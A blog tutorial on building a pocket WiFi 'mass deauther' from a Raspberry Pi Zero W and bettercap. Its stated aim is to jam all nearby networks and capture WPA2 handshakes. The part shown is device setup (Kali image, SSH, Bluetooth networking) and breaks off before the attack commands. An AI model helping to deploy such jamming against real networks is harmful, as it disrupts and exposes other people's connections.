{
  "Source": "www.evilsocket.net",
  "Title": "Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W",
  "Link": "https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/",
  "Content": "\u003cdiv class=\"content\" itemprop=\"articleBody\"\u003e\n\u003cp\u003eA few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all the channels in the WiFi spectrum, collects information about the nearby access points and their connected clients and then sends a deauthentication packet to each one of them, resulting in some sort of WiFi jammer on the 802.11 level. As an interesting “side effect” of this jammer (the initial intent was \u003cem\u003epurely for the lulz\u003c/em\u003e) is that the more it deauths, the higher the changes to also sniff WPA2 handshakes.\u003c/p\u003e\n\u003cp\u003eThanks to the awesome work of the Kali and Nexmon communities in packaging the nexmon drivers and utilities and to the recent changes we released in bettercap, this was very easy to setup and to script and given \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://twitter.com/evilsocket/status/1021367629901115392\"\u003ethe interest the tweet had\u003c/a\u003e I thought to share this writeup :)\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2018/07/deauth.png\" alt=\"deauth\"/\u003e\u003c/p\u003e\n\u003ccenter\u003e\u003csmall\u003e\u003ci\u003eThis awesome case has been designed by \u003ca href=\"https://twitter.com/elkentaro\" target=\"_blank\"\u003e@elkentaro\u003c/a\u003e and can be found on [his Thingverse page](https://www.thingiverse.com/thing:3018480).\u003c/i\u003e\u003c/small\u003e\u003c/center\u003e\n\u003cspan id=\"more\"\u003e\u003c/span\u003e\n\u003ch3 id=\"0x00-FAQ\"\u003e\u003ca href=\"#0x00-FAQ\" class=\"headerlink\" title=\"[0x00] FAQ\"\u003e\u003c/a\u003e[0x00] FAQ\u003c/h3\u003e\u003cp\u003e\u003cstrong\u003eWhy not using Nethunter or some other Kali image for Android and a smartphone instead?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eMonitor mode works, injection doesn’t. Using an external WiFi makes the whole thing bigger and kills the battery.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy not using … instead?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eThere are many alternatives to the setup I’m going to describe, it’s not necessarily the best, just the one that works for me.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy …?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eBECAUSE. The point of this post is not just the hardware, but mostly how to use bettercap to attack wifi.\u003c/p\u003e\n\u003ch3 id=\"0x01-Kali-image-and-initial-headless-configuration\"\u003e\u003ca href=\"#0x01-Kali-image-and-initial-headless-configuration\" class=\"headerlink\" title=\"[0x01] Kali image and initial headless configuration.\"\u003e\u003c/a\u003e[0x01] Kali image and initial headless configuration.\u003c/h3\u003e\u003cp\u003eFirst thing first, you’ll need to download the \u003cstrong\u003eKali Linux Rpi0w Nexmon\u003c/strong\u003e image from \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://www.offensive-security.com/kali-linux-arm-images/\"\u003ethis page\u003c/a\u003e and burn it to the uSD card you’re going to use for the rpi using the usual \u003ccode\u003edd\u003c/code\u003e method, but before unmounting it, we need to enable SSH at boot and configure it to connect to our home WiFi network for the initial configuration, keep in mind this is just temporary and the main wifi interface will be used for packet injection later, while we will be able to connect via bluetooth to the board.\u003c/p\u003e\n\u003cp\u003eFrom the computer you used to burn the image on your micro sd, mount it again if needed and then:\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# this will enable ssh at boot\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003etouch /sd-mount-point/boot/ssh\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# let\u0026#39;s setup wlan0\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003enano /sd-mount-point/etc/network/interfaces\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eFill this file with the following contents:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003eauto lo\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eiface lo inet loopback\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eallow-hotplug wlan0\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eiface wlan0 inet dhcp\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ewpa-conf /etc/wpa_supplicant/wpa_supplicant.conf\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eiface default inet dhcp\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eNow we’ll add the details of the WiFi network we want the rpi to connect automatically for configuration:\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003enano /sd-mount-point/etc/wpa_supplicant/wpa_supplicant.conf\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eAnd add this:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003ecountry=GB\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ectrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eupdate_config=1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003enetwork={\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        ssid=\u0026#34;YourWiFiName\u0026#34;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        psk=\u0026#34;y0urw1f!p455w0rd\u0026#34;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        key_mgmt=WPA-PSK\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eReboot the RPI and it should connect to your WiFi, search for its IP address (either by broadcast ping, or using bettercap itself, i usually use the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/bettercap/caplets/blob/master/netmon.cap\"\u003enetmon\u003c/a\u003e caplet to see what’s going on on my network) and finally SSH to it using the default Kali credentials:\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# this will allow you to login with your SSH key instead of a password\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003essh-copy-id -i ~/.ssh/id_rsa.pub root@pita-ip\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003essh root@pita-ip\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eOnce you’re logged in:\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e19\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e20\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e21\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e22\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e23\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e24\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e25\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e26\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e27\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e28\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e29\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e30\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e31\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e32\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e33\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e34\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e35\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e36\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e37\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e38\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e39\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e40\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# always change the default root password\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003epasswd\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# regenerate ssh keys\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003essh-keygen\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# set a nicer hostname :D\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ehostname -b pita\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eecho\u003c/span\u003e pita \u0026gt; /etc/hostname\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"string\"\u003e\u0026#34;127.0.0.1 pita\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /etc/hosts\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# update the system\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eapt update \u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eapt upgrade\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# install a few useful packages and setup swap\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eapt install git dphys-swapfile\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# set CONF_SWAPSIZE to 1024\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003enano /etc/dphys-swapfile\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003esystemctl \u003cspan class=\"built_in\"\u003eenable\u003c/span\u003e dphys-swapfile\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# set the correct timezone\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003edpkg-reconfigure tzdata\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# reboot to apply the effects\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ereboot```\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e### [0x02] Connecting via Bluetooth with bt-nap\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eWe want to use `wlan0` \u003cspan class=\"keyword\"\u003efor\u003c/span\u003e the monitor mode and injection using Nexmon, meaning we need another way to connect to our board. For this, we can setup the rpi to work as a bt-nap server, basically you will be able to connect via bluetooth and reach it with an IP address on that bluetooth connection, this works both from a laptop and from a smartphone as well.\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u0026lt;center\u0026gt;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u0026lt;blockquote class=\u003cspan class=\"string\"\u003e\u0026#34;twitter-tweet\u0026#34;\u003c/span\u003e data-conversation=\u003cspan class=\"string\"\u003e\u0026#34;none\u0026#34;\u003c/span\u003e data-lang=\u003cspan class=\"string\"\u003e\u0026#34;it\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;p lang=\u003cspan class=\"string\"\u003e\u0026#34;en\u0026#34;\u003c/span\u003e dir=\u003cspan class=\"string\"\u003e\u0026#34;ltr\u0026#34;\u003c/span\u003e\u0026gt;Power from your smartphone, ssh over bluetooth and a mass deauther \u003cspan class=\"keyword\"\u003ein\u003c/span\u003e your pocket 😈\u0026lt;a href=\u003cspan class=\"string\"\u003e\u0026#34;https://twitter.com/bettercap?ref_src=twsrc%5Etfw\u0026#34;\u003c/span\u003e\u0026gt;@bettercap\u0026lt;/a\u0026gt; + \u0026lt;a href=\u003cspan class=\"string\"\u003e\u0026#34;https://twitter.com/hashtag/pita?src=hash\u0026amp;amp;ref_src=twsrc%5Etfw\u0026#34;\u003c/span\u003e\u0026gt;\u003cspan class=\"comment\"\u003e#pita\u0026lt;/a\u0026gt; = ❤️ \u0026lt;a href=\u0026#34;https://t.co/lDn9Tie3W9\u0026#34;\u0026gt;pic.twitter.com/lDn9Tie3W9\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\u0026amp;mdash; 👽 (@evilsocket) \u0026lt;a href=\u0026#34;https://twitter.com/evilsocket/status/1021378841749721091?ref_src=twsrc%5Etfw\u0026#34;\u0026gt;23 luglio 2018\u0026lt;/a\u0026gt;\u0026lt;/blockquote\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u0026lt;script async src=\u003cspan class=\"string\"\u003e\u0026#34;https://platform.twitter.com/widgets.js\u0026#34;\u003c/span\u003e charset=\u003cspan class=\"string\"\u003e\u0026#34;utf-8\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u0026lt;/center\u0026gt;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eLet\u003cspan class=\"string\"\u003e\u0026#39;s connect once more via WiFi and SSH:\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"string\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"string\"\u003e```sh\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"string\"\u003essh root@pita-ip\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"string\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"string\"\u003e# install a few dependencies\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"string\"\u003eapt install pulseaudio pulseaudio-module-zeroconf alsa-utils avahi-daemon pulseaudio-module-bluetooth\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"string\"\u003egit clone https://github.com/bablokb/pi-btnap.git\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"string\"\u003e# install btnap as a server\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"string\"\u003e./pi-btnap/tools/install-btnap server\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eFix the bluetooth configuration file \u003ccode\u003e/etc/systemd/system/bluetooth.target.wants/bluetooth.service\u003c/code\u003e by disabling the SAP plugin that would break bluetooth, change the \u003ccode\u003eExecStart\u003c/code\u003e part with:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003eExecStart=/usr/lib/bluetooth/bluetoothd --noplugin=sap\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eLet’s set the bluetooth name of your device by editing \u003ccode\u003e/etc/bluetooth/main.conf\u003c/code\u003e and finally edit the btnap configuration file itself, \u003ccode\u003e/etc/btnap.conf\u003c/code\u003e:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003eMODE=\u0026#34;server\u0026#34;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eBR_DEV=\u0026#34;br0\u0026#34;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eBR_IP=\u0026#34;192.168.20.99/24\u0026#34;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eBR_GW=\u0026#34;192.168.20.1\u0026#34; \u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eADD_IF=\u0026#34;lo\u0026#34; \u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eREMOTE_DEV=\u0026#34;\u0026#34; \u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eDEBUG=\u0026#34;\u0026#34;\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eEnable all the services at boot and restart them:\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003esystemctl \u003cspan class=\"built_in\"\u003eenable\u003c/span\u003e bluetooth\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003esystemctl \u003cspan class=\"built_in\"\u003eenable\u003c/span\u003e btnap\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003esystemctl \u003cspan class=\"built_in\"\u003eenable\u003c/span\u003e dnsmasq\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eservice bluetooth restart\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eservice dnsmasq restart\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eservice btnap restart\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eBefore being able to connect via bluetooth, we need to manually pair and trust the device we’re going to use (remember to repeat this step for every new device you want to allow to connect to the PITA board), make sure your control device (your laptop for instance) has bluetooth enabled and it’s visible, then from the pita:\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003ebluetoothctl\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u0026gt; agent on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u0026gt; scan on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e... \u003cspan class=\"built_in\"\u003ewait\u003c/span\u003e \u003cspan class=\"keyword\"\u003efor\u003c/span\u003e your device to show up ...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e... now pair with its address\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u0026gt; pair aa:bb:cc:dd:ee:ff\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e... and trust it permantently ...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u0026gt; trust aa:bb:cc:dd:ee:ff\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e... \u003cspan class=\"built_in\"\u003ewait\u003c/span\u003e ...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u0026gt; quit\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eWe’re now ready to “free” the wlan0 interface and use it for more cool stuff, let’s change the file \u003ccode\u003e/etc/network/interfaces\u003c/code\u003e to:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan 